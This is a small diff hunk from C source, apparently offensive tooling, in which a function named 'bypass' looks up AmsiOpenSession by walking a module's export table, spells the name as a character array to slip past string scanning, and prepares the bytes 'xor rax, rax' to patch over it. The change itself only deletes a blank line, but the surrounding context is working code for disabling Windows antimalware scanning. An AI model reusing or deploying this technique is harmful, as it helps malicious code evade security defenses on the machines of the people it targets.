@@ -505,7 +505,6 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, DWORD NtProtSysca
         char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
         void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);
 
-        
         unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
         Base = pAmsiOpenSession;
         Size = sizeof(amsibypass);
